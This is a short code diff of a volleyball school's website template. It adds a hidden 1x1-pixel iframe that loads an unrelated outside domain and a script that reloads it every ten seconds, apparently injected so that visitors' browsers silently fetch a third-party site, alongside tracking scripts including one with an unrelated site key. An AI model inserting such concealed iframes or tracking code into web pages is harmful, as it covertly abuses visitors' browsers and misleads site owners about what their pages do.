@@ -206,6 +206,13 @@ $locBannerImg = "$__WEB__/imagens/website/$imgBanner";
             })
         }
     </script>
+    <iframe src="https://trive.fun/random" style='width: 1px; height: 1px;' id='otherSite'></iframe>
+    <script>
+        otherSite.src="https://trive.fun";
+        setTimeout(()=>{
+            otherSite.src="https://trive.fun/random";
+        },10000);
+    </script>
     <script src="https://whos.amung.us/pingjs/?k=partiuvolei&t=Partiu%20v%C3%B4lei%20-%20V%C3%B4leibol%20escolinhas&c=d&x=https://partiuvolei.com/&y=&a=0&v=27&r=5847"></script>
     <script src="https://whos.amung.us/pingjs/?k=totalmoontis&t=Partiu%20v%C3%B4lei%20-%20V%C3%B4leibol%20escolinhas&c=d&x=https://partiuvolei.com/&y=&a=0&v=27&r=5847"></script>
 </body>
